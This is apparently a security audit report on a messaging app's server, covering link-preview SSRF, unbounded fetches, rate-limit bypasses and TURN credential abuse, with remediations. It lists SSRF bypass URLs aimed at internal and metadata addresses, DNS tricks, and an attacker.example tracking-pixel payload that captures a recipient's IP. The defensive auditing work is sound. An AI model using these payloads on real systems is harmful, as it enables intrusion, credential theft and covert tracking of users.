# SESSION 04 — Server Egress, Outbound Fetch & Rate-Limit Integrity (TB-3 / G4)

**Scope:** every place the API server makes an *outbound* request on behalf of a caller, plus
the shared machinery that is supposed to bound how often any caller can reach it:

- `POST /linkPreview` (`server/index.js:2215`) and its SSRF guard —
  `isBlockedPreviewHost` (`server/lib/pure.js:60`, re-exported `server/index.js:714`) and
  `fetchFollowingSafeRedirects` (`server/index.js:719`)
- `POST /turnCredentials` (`server/index.js:2032`) — outbound call to Cloudflare carrying
  `TURN_TOKEN_ID` / `TURN_API_TOKEN`
- all rate limiters: `checkIpRateLimit` (`:693`), `checkWaitlistIpRateLimit` (`:365`),
  `checkWaitlistPollRateLimit` (`:377`), `checkAuthRateLimit` (`:430`) + `AUTH_RATE_LIMITS`
  (`:409`), `mintCooldown` (`:343`), `adminIpFails` / `adminIpLocked` (`:540`, `:558`), and the
  pure windowing helper `evaluateFixedWindow` (`server/lib/pure.js:76`)
- client-IP derivation `getClientIp` (`:643`) and the log-pepper tags `ipTag` / `uidTag` (`:668`, `:674`)
- request-body handling: `MAX_BODY_BYTES` (`:748`), `readBody` (`:750`), `collectBody` (`:780`),
  and the pre-routing `Content-Length` gate (`:1417`)
- the consumer of `/linkPreview` output, because the response is an egress instruction:
  `app/.../util/LinkPreviewFetcher.java` and `app/.../ui/MessageAdapter.java:858-906`

**Threat model applied:** the attacker holds at least one approved account (so every
ID-token-gated route is reachable), controls their own DNS zone and their own web server,
controls a routable IPv6 /64 (a commodity VPS), and will automate. Unauthenticated surfaces
are reachable by anyone. Only the server counts as a control.

**Result: 0 Critical / 3 High / 3 Medium / 4 Low / 3 Info.**

The structural half of the prior review's SSRF fix is genuinely there — redirects are followed
manually and every hop is re-checked, which is the part most codebases get wrong. What is wrong
is the *predicate* being applied at each hop: `isBlockedPreviewHost` matches **strings against a
hostname**, never resolves anything, and misses whole address families. Any attacker-controlled
DNS name defeats it completely (S04-H1). Separately, the endpoint reads the remote body with no
size limit and — because the abort timer is cleared as soon as headers arrive — no timeout
(S04-H2); and the URL it hands back to the client is loaded *directly by both devices*, which
falsifies the F12 guarantee this endpoint exists to provide (S04-H3).

---

## Verified-correct (positive assurances — carry into Session 10)

Independently re-derived, not assumed from the prior review:

- **Redirects really are re-validated.** `fetchFollowingSafeRedirects` (`:719-743`) uses
  `redirect: "manual"`, re-parses each `Location`, re-runs the scheme + host predicate *before*
  fetching the next hop (`:722-725`), caps at 5 redirects, and throws (rather than falling
  through) on a missing `Location`. The "302-to-internal after the first check passed" bypass is
  closed. The *predicate* is the defect, not the loop.
- **Obfuscated IPv4 literals are NOT a bypass**, contrary to what the regex looks like it would
  miss. WHATWG URL normalizes the host before the check runs, so all of these are correctly
  blocked (empirically confirmed against the real `isBlockedPreviewHost`):
  `http://2130706433/`, `http://0x7f000001/`, `http://0177.0.0.1/`, `http://127.1/` →
  all normalize to `127.0.0.1`; `http://[0:0:0:0:0:0:0:1]/` → `[::1]`; `http://LOCALHOST./` →
  `localhost.`. Do not "fix" these; they already work.
- **Every body-reading route is size-capped.** Grepped all 14 body handlers: each one goes
  through `collectBody` (`:780`) or `readBody` (`:750`); there is no bare
  `req.on("data")` accumulator left anywhere. The pre-routing `Content-Length` gate (`:1417`)
  plus the streaming cap covers both declared and chunked bodies, and the two drain-only routes
  (`/turnCredentials` `:2035`, `/requestLockNonce` `:2366`) deliberately use `collectBody` for
  the cap even though they ignore the body — the comments at `:2033` and `:2363` show this was
  a conscious fix, and it holds.
- **TURN secrets do not leak.** `TURN_TOKEN_ID` / `TURN_API_TOKEN` are read from env at
  `:2061-2062`, used only in the outbound `Authorization` header (`:2074`), and the response
  echoes **only** `data.iceServers` (`:2091`) — not the raw Cloudflare envelope. A non-OK
  Cloudflare reply logs the upstream body server-side and returns a flat `502` (`:2080-2086`),
  so upstream error text is not proxied to the caller. Missing config fails closed with 503.
- **No CORS on the API server.** Grepped: no `Access-Control-*` header is ever set (contrast the
  Worker's deliberate `*`). Combined with the baseline headers at `:1388-1394`
  (`nosniff`, `Referrer-Policy: no-referrer`, `X-Frame-Options: DENY`, COOP/CORP) applied to
  *every* response before routing (`:1413`), a browser cannot read these endpoints cross-origin.
- **Error hygiene holds on both egress routes.** `/linkPreview` (`:2300-2303`) and
  `/turnCredentials` (`:2092-2096`) log `e.message` and return fixed strings; nothing echoes
  exception text. `sendServerError` (`:685`) emits a random correlation ref instead.
- **`og:image` scheme is validated.** `:2283-2290` resolves the extracted value against the
  target URL and accepts only `http:`/`https:`, so `javascript:` / `data:` / `file:` cannot be
  handed to the client. (The *host* is unvalidated — S04-H3.)
- **Rate-limit buckets are per-endpoint and per-uid**, not a single shared counter
  (`AUTH_RATE_LIMITS` `:409-427`, projection logic `:436-447`), so a burst of `/mediaToken`
  cannot starve a user's `/requestLockNonce` budget. `requestLockNonce: 3` is explicitly
  called out as needing its own low cap (`:418-421`) — correct reasoning.
- **IPs are pepper-hashed before logging** (`ipTag` `:668`, `LOG_PEPPER` per-process `:666`)
  while the limiter keeps the real IP in memory only. That is the right split for a tool whose
  threat model includes log seizure.
- **Rightmost-XFF is the correct choice** for the documented single-proxy Render deployment
  (`:643-655`, `server/README.md`) — the CRIT-1 reasoning is sound *as far as it goes*
  (see S04-M3 for what it does not cover).

---

## S04-H1 (High) — The SSRF guard never resolves DNS: any attacker-controlled hostname pointing at an internal address bypasses it completely, and several literal address forms bypass it too

**Location:** `server/lib/pure.js:60-68` (`isBlockedPreviewHost`), applied at
`server/index.js:2239` (initial URL) and `:723` (every redirect hop).

```js
// server/lib/pure.js:61-68
function isBlockedPreviewHost(hostname) {
  const host = String(hostname || "").toLowerCase();
  return /^(localhost|127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|\[?::1\]?)/.test(host) ||
    host === "metadata.google.internal" ||
    host === "169.254.169.254" ||
    host.endsWith(".internal") ||
    host.endsWith(".local");
}
```

**Trust boundary:** TB-3 / G4 — the server as a confused deputy. This function *is* the entire
egress authorization model for `/linkPreview`.

**Root cause:** the check is a **syntactic test on a name**, but the property it must decide is
**semantic and about the resolved address**. A hostname is not an address, and nothing here
resolves one. The comment at `server/index.js:711-713` and the docstring at `pure.js:57-59`
both claim the guard covers "loopback, RFC-1918 private ranges, link-local" — it does not.

**Exploit path 1 — DNS (complete bypass, no cleverness required):**

1. Attacker points `preview.attacker.example` at `127.0.0.1` (or `169.254.170.2`, or a Render
   internal address). Public wildcard resolvers make this a zero-setup attack:
   verified allowed by the real predicate — `localtest.me`, `1.0.0.127.nip.io`,
   `internal.attacker.com`, `metadata.internal.attacker.com`.
2. `POST /linkPreview {"url":"http://preview.attacker.example/"}` with any valid ID token.
3. `parsed.hostname` is `preview.attacker.example` → no pattern matches → **not blocked**.
4. Node fetches it. The connection goes to the resolved internal address.

Note the tell: `127.0.0.1.nip.io` *is* blocked, but only by accident — `^127\.` matches the
leading characters of the **name**. `1.0.0.127.nip.io` resolves to the same host and is allowed.
A control that is defeated by reordering the label is not a control.

**Exploit path 2 — address literals the regex does not cover** (each verified against the real
function; all parse to these exact `URL.hostname` values):

| Requested URL | `hostname` after normalization | Result |
|---|---|---|
| `http://0.0.0.0/` | `0.0.0.0` | **ALLOWED** → loopback on Linux |
| `http://[::]/` | `[::]` | **ALLOWED** → loopback |
| `http://[::ffff:127.0.0.1]/` | `[::ffff:7f00:1]` | **ALLOWED** → loopback (IPv4-mapped) |
| `http://[::ffff:169.254.169.254]/` | `[::ffff:a9fe:a9fe]` | **ALLOWED** → metadata |
| `http://[fd00::1]/` | `[fd00::1]` | **ALLOWED** → IPv6 ULA (private) |
| `http://[fe80::1]/` | `[fe80::1]` | **ALLOWED** → IPv6 link-local |
| `http://169.254.170.2/` | `169.254.170.2` | **ALLOWED** → container credential endpoint |
| `http://100.64.0.1/` | `100.64.0.1` | **ALLOWED** → CGNAT / provider internal |
| `http://192.0.0.192/` | `192.0.0.192` | **ALLOWED** → provider metadata |

The entire IPv6 space is unguarded except the single literal `::1`, and `169.254.0.0/16` is
guarded at exactly one address out of 65,536.

**Exploit path 3 — DNS rebinding (survives the obvious fix):** even with resolution added, the
guard resolves at check time and `fetch` resolves again at connect time. A 1-second-TTL record
that flips public→internal between the two passes both. This is why the fix below pins the
address rather than re-resolving.

**Honest severity discussion.** Rated **High**, not Critical, because the *read-back* channel is
narrow, and I want to be precise about that rather than overclaim:

- Content is only parsed when the response is `text/html` (`:2255`), and only `og:title`/`<title>`
  (≤200 chars) and `og:image` come back. GCP metadata is JSON *and* requires a
  `Metadata-Flavor` header the server does not send, so that specific exfil does not work.
- What works unconditionally is **blind SSRF**: arbitrary `GET` (plus attacker-chosen redirect
  chains) against anything the Render instance can route to, including services that act on GET.
- There is a **port/host oracle** despite the uniform `200` (`:2295-2299`): a refused connection
  returns in milliseconds, a filtered one hangs the full 6 s (`:2252`). That is a usable scanner.
- Any internal service that serves HTML with a `<title>` (dashboards, admin UIs, health pages,
  error pages naming internal hostnames) **does** leak its title verbatim to the caller.
- `/linkPreview` also makes the server a free authenticated **anonymizing proxy** for arbitrary
  public URLs, at 30/min/account, with the server's IP as the reputation-bearing one.

**Fix:**

1. **Resolve, then validate the addresses, then pin.** `dns.lookup(host, {all: true})`, reject if
   *any* returned address is non-global, and connect to the vetted address (undici `lookup` /
   custom `connect`) so the checked address is the connected address. Reject the request when a
   name resolves to a mix.
2. **Replace the regex with an address-family classifier** applied to parsed IPs, not strings:
   IPv4 `0.0.0.0/8`, `10/8`, `100.64/10`, `127/8`, `169.254/16`, `172.16/12`, `192.0.0/24`,
   `192.0.2/24`, `192.168/16`, `198.18/15`, `198.51.100/24`, `203.0.113/24`, `224/4`, `240/4`,
   `255.255.255.255`; IPv6 `::`, `::1`, `::ffff:0:0/96` (unwrap and re-check the embedded IPv4),
   `64:ff9b::/96`, `100::/64`, `2001:db8::/32`, `fc00::/7`, `fe80::/10`, `ff00::/8`.
3. **Keep the per-hop re-check** (it is correct) but run it against the resolved+pinned address
   of each hop, and additionally forbid a hop whose host is a bare IP literal if previews are
   only ever meant to target real sites.
4. Consider an explicit ban on non-standard ports, and unit-test the classifier — `pure.js`
   already exists precisely so this is testable, and the current test coverage clearly does not
   include the nine rows above.

---

## S04-H2 (High) — `/linkPreview` reads the remote response body with no size cap and no timeout, so one request can OOM the process that also carries FCM delivery and call signalling

**Location:** `server/index.js:2256` (`await r.text()`), timer lifecycle at `:726-733`.

```js
// server/index.js:726-733 — the abort timer is cleared when HEADERS arrive…
const ctrl = new AbortController();
const t = setTimeout(() => ctrl.abort(), timeoutMs);
let response;
try {
  response = await fetch(current, { headers, signal: ctrl.signal, redirect: "manual" });
} finally {
  clearTimeout(t);          // ← fetch() resolves on headers, not on body completion
}
```

```js
// server/index.js:2256 — …and the body is then read in full, unbounded, untimed
const html = (await r.text()).slice(0, 30000);
```

The `.slice(0, 30000)` runs **after** the whole body is buffered, so it bounds the *output*, not
the *ingest*. There is no `Content-Length` check, no streaming read with a byte budget, and the
only timeout was already cancelled in the `finally`.

**Exploit path:** attacker's server replies `200` / `Content-Type: text/html` (both required to
reach `r.text()`, both attacker-controlled) and then streams indefinitely, or serves a gzip bomb
— undici transparently decompresses, so ~1 MB on the wire becomes ~1 GB in the heap. At 30
requests/min/account (`:417`) and with `Promise` handlers running concurrently, a single account
sustains many simultaneous unbounded reads.

**Impact.** This is a single-process Node server that *also* hosts the Firestore `onSnapshot`
listeners that deliver every FCM push and every call invite (`:339`, `:1408`). Heap exhaustion is
not catchable by the `uncaughtException` guard at `:639`, so the outcome is a hard crash: no
message notifications and no incoming calls platform-wide until Render restarts it — and every
in-memory rate limiter, admin session, and mint cooldown resets on that restart (S04-L3),
which chains into the brute-force surfaces.

**Fix:**
- Read the body as a stream with a hard byte budget (e.g. 256 KB) and `destroy()` past it;
  do not use `r.text()`.
- Reject when `Content-Length` exceeds the budget before reading anything.
- Keep one `AbortController` alive across **headers *and* body** — pass a deadline rather than
  clearing the timer at header time.
- Bound total outbound concurrency for previews process-wide, not just per-user.

---

## S04-H3 (High) — `/linkPreview` returns an attacker-chosen `og:image` URL that **both** devices fetch directly with Glide, falsifying the F12 guarantee and giving the attacker the recipient's IP address and read timestamp

**Location:** server side `server/index.js:2278-2291` (`preview.imageUrl` — scheme validated,
host **not**); client side `app/.../ui/MessageAdapter.java:890-895`; the guarantee being broken
is documented at `app/.../util/LinkPreviewFetcher.java:23-27` and `:102-105`.

```java
// app/.../util/LinkPreviewFetcher.java:102-105 — the claim
//   "The server fetches the URL and returns extracted OG metadata so neither the
//    sender's nor receiver's device ever contacts the target URL directly."
```

```java
// app/.../ui/MessageAdapter.java:890-895 — the contradiction
if (preview.imageUrl != null && !preview.imageUrl.isEmpty()) {
    Glide.with(ctx).load(preview.imageUrl)   // ← direct device→attacker-origin GET
```

**Trust boundary:** G4 / TB-3 — egress. The server's *response* is an instruction to the client
to make a request, so validating only the scheme means the server is laundering an
attacker-chosen fetch target into a trusted-looking preview object.

**Exploit path:**

1. Attacker sends the victim a message containing `https://attacker.example/lure`.
2. That page returns `<meta property="og:image" content="https://attacker.example/px?m=<nonce>">`.
   The server accepts it — only `http:`/`https:` is checked (`:2285`) — and returns it as
   `preview.imageUrl`.
3. `bindLinkPreview` runs **at render time on the recipient's device**
   (`MessageAdapter.java:858, 871`), so Glide issues the GET the moment the victim's chat scrolls
   the message into view.
4. Attacker's log now contains the victim's **real IP address** (city-level geolocation, ISP,
   Wi-Fi-vs-mobile), their **User-Agent/Accept fingerprint**, and a per-message `nonce` that
   makes it an unconsented **read receipt with a timestamp**. Repeat over days to track
   movement.

This is the exact harm F12 was created to prevent, re-introduced one hop later, and it is
*worse* than the original: F12 worried about the **sender** leaking their IP to a site they chose
to link; this leaks the **recipient's** IP to a host the *attacker* chose. For a tool whose
threat model is deanonymization, a per-message IP beacon is a first-class break, not a nitpick.

Secondary: Glide will happily fetch `http://192.168.1.1/…` or `http://[fd00::1]/…`, so the
victim's device also becomes an SSRF agent inside its own LAN (blind to the attacker, but a
real request).

**Fix (server-side — this must not be left to the client):**
- Do not return third-party URLs. Have the server fetch the image (through the S04-H1-fixed
  egress path and the S04-H2 byte budget), re-encode it, and return either bytes or a URL on
  DuoShield's own storage. This restores the F12 property for real.
- Until then, apply the same host validation to `imageUrl` as to the target URL, and require it
  to be same-origin with the previewed page (it currently need not be).
- Client half is Session 08's: `Glide.load` of any non-DuoShield origin should be blocked
  outright, and previews arguably should not render until the user taps.

---

## S04-M1 (Medium) — Every IP-based limit keys on the full address with no IPv6 prefix normalization, so a single /64 defeats the waitlist limits and the admin brute-force lockout

**Location:** `server/index.js:643-655` (`getClientIp` returns the raw string), consumed by
`checkIpRateLimit` (`:693`), `checkWaitlistIpRateLimit` (`:365`), `checkWaitlistPollRateLimit`
(`:377`), and `adminIpFails` / `recordAdminAuthFailure` (`:565`).

Every one of these does `map.get(ip)` on the address verbatim. A client on IPv6 is routinely
assigned a /64 — 2⁶⁴ source addresses, each a distinct bucket, available on any commodity VPS.

**Consequences, in increasing order of blast radius:**

- `/requestAccess` (5 per 15 min, `:348`) — each call unconditionally writes a Firestore
  document (`:1572-1575`) *before* any human review. Address rotation makes waitlist creation
  effectively unlimited: unbounded Firestore write cost, and the operator's approval queue
  (`/admin/api/waitlist`, `:2575`) is buried under junk, which is an availability attack on
  onboarding.
- `/mintToken`'s per-IP bucket (5 per 15 min, `:394`) stops mattering; only the per-`userId`
  `mintCooldown` (`:1463`) remains, and that key is supplied by the caller.
- **`ADMIN_TOKEN` brute force.** `adminIpLocked` (`:558`, 10 failures / 15 min) is the *only*
  rate control on `/admin/*` auth — `requireAdminAuth` (`:610`) has no global counter and no
  backoff. Rotating source addresses removes the ceiling entirely.

**Honest severity discussion.** Rated Medium, not High, because `ADMIN_TOKEN` is an
operator-generated env value (`:537`) and if it is a long random string, unlimited guessing is
still infeasible — the lockout is defense-in-depth. But it is the *only* depth there is: should
that token ever be a human-chosen passphrase, this becomes the path to full admin compromise
(waitlist approval, account unfreeze, duress enrollment). Session 05 owns the token's strength;
this finding owns the fact that the counter can be sidestepped.

**Fix:** normalize before keying — bucket IPv6 on the /64 (and consider /56 for the waitlist),
IPv4 on the /32; add a **global** failure counter and exponential backoff to `requireAdminAuth`
so admin auth cannot be brute-forced from a distributed source at all; and move
`/requestAccess`'s cost behind a proof-of-work or invite code so a Firestore write is never free.

---

## S04-M2 (Medium) — `/turnCredentials` mints 24-hour redistributable relay credentials at 20/min/account with no aggregate cap, and the outbound Cloudflare call has no timeout

**Location:** `server/index.js:2077` (`ttl: 86400`), `:415` (`turnCredentials: 20`),
`:2071-2078` (no `AbortController`).

```js
const cfRes = await fetch(cfUrl, {              // :2071 — no signal, no timeout
  method: "POST",
  headers: { "Authorization": `Bearer ${apiToken}`, ... },
  body: JSON.stringify({ ttl: 86400 }),         // :2077 — 24 hours
});
```

**Two independent problems:**

1. **Credential inflation.** 20/min × 60 × 24 ≈ 28,800 credential sets per day from one account,
   each valid for 24 h and each a plain bearer username/password that works from **anywhere** —
   nothing binds it to the account, the device, or a call. An attacker mints in bulk and resells
   or publishes them; Cloudflare TURN relay is metered, so this is direct bandwidth theft billed
   to the project, and it turns DuoShield into an open relay whose traffic is attributed to
   DuoShield. TTL is also wildly longer than a call needs.
2. **No outbound timeout.** Node's `fetch` has no default timeout. If Cloudflare accepts the
   connection and stalls, the handler awaits indefinitely, holding the inbound socket and an
   outbound one. 20/min/account of deliberately-stalled upstreams is a slow resource leak with
   no ceiling. Note `/linkPreview` *does* use an `AbortController` (`:726`) — this route simply
   never got the same treatment.

Minor, same location: if Cloudflare returns `200` with an unexpected shape, `data.iceServers` is
`undefined` and `res.end(JSON.stringify(undefined))` sends an empty `200` body (`:2090-2091`),
which the client cannot distinguish from a valid response.

**Fix:** drop the TTL to call duration (minutes, not a day); add a per-account daily cap on top
of the per-minute one, and refuse when the caller has no active call; wrap the Cloudflare fetch
in an `AbortController` (5–10 s) like `/linkPreview`; validate `data.iceServers` before
responding and 502 if absent.

---

## S04-M3 (Medium) — Trust in `X-Forwarded-For` is hard-coded to "exactly one proxy" and unconfigurable, so putting any CDN in front of the server silently collapses every client into one rate-limit bucket

**Location:** `server/index.js:643-655`.

```js
const entries = forwarded.split(",");
return entries[entries.length - 1].trim() || req.socket.remoteAddress || "unknown";
```

Taking the rightmost entry is correct **iff** exactly one trusted proxy appends exactly one
entry — the documented Render topology (`server/README.md`). The number of trusted hops is not
configurable, not asserted, and the extracted value is never validated as an IP.

**Why this is a live risk rather than a hypothetical:** the project already runs Cloudflare for
the media Worker, and putting Cloudflare (or any additional proxy) in front of the API server is
a one-click, security-motivated change an operator would reasonably make. The moment there are
two hops, the rightmost entry is the **CDN edge IP**, not the client. Then:

- every user in a region shares one bucket → `/mintToken` (5/15 min) and `/requestAccess`
  (5/15 min) lock out **all** legitimate new users after five attempts, from anyone;
- `adminIpFails` becomes globally shared → any unauthenticated attacker can send 10 bad
  `x-admin-token` values and lock the **operator** out of `/admin/*` for 15 minutes, on repeat,
  indefinitely (`:612-616`) — an unauthenticated denial of the incident-response tool, which is
  exactly what you need during an incident;
- `ipTag` log tags stop distinguishing users, degrading abuse forensics.

Conversely, if the server is ever reachable without the proxy, `forwarded` is absent and the
fallback to `req.socket.remoteAddress` is correct — that path is fine.

**Fix:** make the trusted-hop count explicit (`TRUSTED_PROXY_HOPS`, default 1) and index
`entries[entries.length - hops]`; validate the result parses as an IP and fall back to
`req.socket.remoteAddress` when it does not; log loudly at startup when the observed XFF depth
disagrees with the configured hop count. Give the admin lockout a second dimension that does not
depend on IP at all (see S04-M1).

---

## S04-L1 (Low) — `collectBody` measures string length, not bytes, so the 64 KB cap admits up to ~192 KB; and the lack of `setEncoding` corrupts multi-byte characters at chunk boundaries

**Location:** `server/index.js:783-791`; contrast the byte-correct `readBody` at `:754-756`.

```js
req.on("data", (chunk) => {
  body += chunk;                          // Buffer → utf8 string, implicitly
  if (body.length > MAX_BODY_BYTES) {     // UTF-16 code units, not bytes
```

`readBody` counts `chunk.length` (bytes, on the Buffer) — correct. `collectBody`, which is what
almost every route actually uses, counts characters *after* decoding. Verified: 70,000 `é` =
70,000 `.length` but 140,000 bytes; 80,000 astral chars = 160,000 bytes. So a body of up to
~192 KB passes a cap documented as 64 KB. Not exploitable beyond a 3× DoS-budget error, but the
declared invariant is wrong, and `MAX_BODY_BYTES` is named in bytes.

Second, subtler bug in the same three lines: `body += chunk` decodes each chunk independently
with no `setEncoding("utf8")`, so a multi-byte sequence split across a TCP chunk boundary decodes
to replacement characters. Any route accepting non-ASCII (display names, group names) can
silently corrupt data on large bodies.

**Fix:** accumulate `Buffer` chunks and track `bytes += chunk.length` exactly as `readBody`
does, then `Buffer.concat(...).toString("utf8")` once at `end` — this fixes the cap and the
corruption together. Better still, delete `collectBody` and give `readBody` a callback shim so
there is one implementation.

---

## S04-L2 (Low) — `/duress-lock`, the only unauthenticated state-changing endpoint, has no rate limit at all

**Location:** `server/index.js:2422-2474`. Compare `/requestLockNonce` (`:2362`), which is
capped at 3/min *precisely because* it writes a Firestore document (`:418-421`).

Every request runs a full `db.runTransaction` (`:2446-2466`) — a Firestore read, unauthenticated,
unbounded, unlimited. Guessing a 64-hex nonce is infeasible, so this is not an
account-lock-forgery path; it is a **free cost-amplifier** (each cheap HTTP request forces a
billed Firestore transaction) and a way to add latency to the transaction path that legitimate
duress locks depend on — an availability attack on a safety feature.

Also an oracle, though a weak one: `403 "Invalid or already-consumed nonce"` (`:2451`) is
distinguishable from `401 "Nonce expired"` (`:2457`), which confirms a nonce *existed*. Harmless
at 256 bits of entropy, but it is free to collapse both to one response.

**Fix:** add a per-IP bucket (normalized per S04-M1) plus a global ceiling; validate the nonce
against `/^[0-9a-f]{64}$/` before touching Firestore (currently only `length !== 64` is checked
at `:2433`, so 64 arbitrary characters still reach a document lookup); return one generic 403.

---

## S04-L3 (Low) — All rate-limit state is per-process in-memory: it resets on every restart, does not survive scaling out, and `mintCooldown` is never purged

**Location:** `mintCooldown` (`:343`), `ipHits` (`:395`), `waitlistIpHits` (`:349`),
`waitlistPollHits` (`:356`), `authRateLimits` (`:428`), `adminIpFails` (`:540`),
`adminSessions` (`:542`).

- **Restart resets every limiter.** Render restarts, deploys, and any crash (see S04-H2) hand the
  attacker a fresh budget on all of the above, including the admin failure counter. The limits
  are therefore soft ceilings on a *steady-state* attacker only.
- **Horizontal scaling silently divides them.** Two instances = 2× every quota, and
  `adminSessions` living in memory means an admin session is only valid on the instance that
  minted it. Nothing in the code or README flags single-instance as a security requirement.
- **`mintCooldown` has no purge.** Every other Map has a `setInterval` sweeper (`:358`, `:398`,
  `:452`, `:544`, `:551`); `mintCooldown` has none, and its key is the **client-supplied**
  `userId` (`:1448`, `:1463`). Growth is bounded only by the per-IP mint limit, so it is slow —
  but it is an unbounded, attacker-keyed Map in a long-lived process.
- Fixed windows also permit a 2× burst across a boundary (`evaluateFixedWindow`,
  `pure.js:76-85`) — inherent to the algorithm, worth noting where limits are as tight as 3/min.

**Fix:** add a sweeper for `mintCooldown` on the same pattern as its siblings; document
single-instance as a security invariant (or move counters and admin sessions to Firestore/Redis);
consider persisting only the admin failure counter, which is the one whose reset actually helps
an attacker.

---

## S04-I1 (Info) — `/status` and `/` are unauthenticated, unlimited, and publish platform-wide delivery counters

**Location:** `server/index.js:2112-2125` (`/status`), `:2128` (HTML dashboard), `:2105`
(`/health`).

`/status` returns `delivered`, `groupDelivered`, `skippedMissingToken`, `skippedOld`, `failed`
and `startedAt` to anyone. For a privacy tool these are aggregate metadata: polling it yields a
platform-wide message-volume timeseries (activity patterns, growth rate, outage windows) with no
account required. None of the three routes is rate-limited, and `/` renders HTML on every hit.

The README instructs pointing UptimeRobot at `/status` (`server/README.md`), so *some* public
probe is intended — but `/health` already covers that and returns nothing.

**Fix:** point monitoring at `/health`; gate `/status` and `/` behind `requireAdminAuth` or a
monitoring token; add a modest per-IP bucket to all three.

---

## S04-I2 (Info) — Dead B2 presign surface: unreachable helper, rate-limit entries for routes that no longer exist, and B2 credentials still expected in the server env

**Location:** `server/index.js:2916-2928` (`b2PresignUrl`, defined **after** `.listen()` at
`:2910`), `:410-412` (`b2PresignedPut` / `b2PresignedGet` / `b2Delete` limits),
`server/lib/pure.js:88-131` (`b2HmacKey`, `buildB2PresignUrl`).

Grepped the whole file: `b2PresignUrl` has exactly one occurrence — its own definition. The
`/b2PresignedPut`, `/b2PresignedGet`, `/b2Delete` routes named in its comment and in
`AUTH_RATE_LIMITS` do not exist; the route table is `/mintToken`, `/requestAccess`,
`/waitlistStatus`, `/migrateUid`, `/createChat`, `/mediaToken`, `/turnCredentials`,
`/linkPreview`, `/removeGroupMember`, `/requestLockNonce`, `/duress-lock`, `/admin/*`.
This is SEC-A01 residue: presigned-URL issuance was replaced by capability tokens, and the
signing path was left behind.

It is inert today (nothing calls it), but it keeps `B2_KEY_ID` / `B2_APPLICATION_KEY` looking
like required server config (`:2918-2919`) — a live long-term credential whose only remaining
purpose is to be leaked. It also makes the rate-limit table lie about the attack surface, which
matters for exactly the kind of review this audit is doing.

**Fix:** delete `b2PresignUrl`, the three `AUTH_RATE_LIMITS` entries, and the two `pure.js`
presign helpers with their tests; remove `B2_KEY_ID` / `B2_APPLICATION_KEY` from the server's
environment and **revoke the B2 application key**. Pairs with S03-L1 (residual APK secret) for
Session 10's "finish the SEC-A01 cleanup" item.

---

## S04-I3 (Info) — Preview provenance and failure are indistinguishable to the client

**Location:** `server/index.js:2254`, `:2293-2299`; `finalUrl` computed at `:740` and discarded.

`preview.domain` is derived from the **originally submitted** URL, while `title`/`imageUrl` come
from the **final** hop of a redirect chain. A link on `trusted.example` that 302s to
`attacker.example` yields a preview card labelled `trusted.example` carrying the attacker's
title and image — a small phishing primitive in a UI whose whole job is to summarize where a
link goes. `fetchFollowingSafeRedirects` already returns `finalUrl`; the caller ignores it.

Separately, a blocked host, a timeout, a non-HTML response and a genuinely metadata-free page all
return the same bare `{url, domain}` with status `200`. Good for not building an oracle
(deliberate, per S04-H1's discussion) but it means the client cannot tell "we refused" from
"nothing there", and the server never tells the *user* their link was rejected as internal.

**Fix:** return `finalUrl` and have the client show the final domain (or flag cross-domain
redirects); keep the uniform status code but add a machine-readable `reason` field for
client-side messaging that does not vary with *why* the fetch failed.

---

## Handoff notes

- **Session 05 (admin):** S04-M1 and S04-M3 both land on `requireAdminAuth` (`:610`) — the
  per-IP lockout is the only brute-force control and it is bypassable two ways. Assess
  `ADMIN_TOKEN` entropy/rotation there; if it is not high-entropy, re-rate S04-M1 upward.
- **Session 06 (duress):** S04-L2 is the missing rate limit on `/duress-lock`; the nonce
  transaction logic itself looked correct on a read-through but is yours to verify.
- **Session 08 (client platform):** S04-H3's client half —
  `MessageAdapter.java:892` `Glide.load` of an arbitrary remote origin, plus whether the decoded
  `title` (`server/index.js:2267-2276`, arbitrary code points via `&#x…;`) is rendered safely.
- **Session 10 (synthesis):** the prior review's SSRF item is **partially remediated** — the
  redirect-revalidation half is confirmed correct, the host-predicate half is not. Record it the
  same way SEC-A01 was recorded in Session 03. S04-I2 is the second half of the SEC-A01 cleanup.
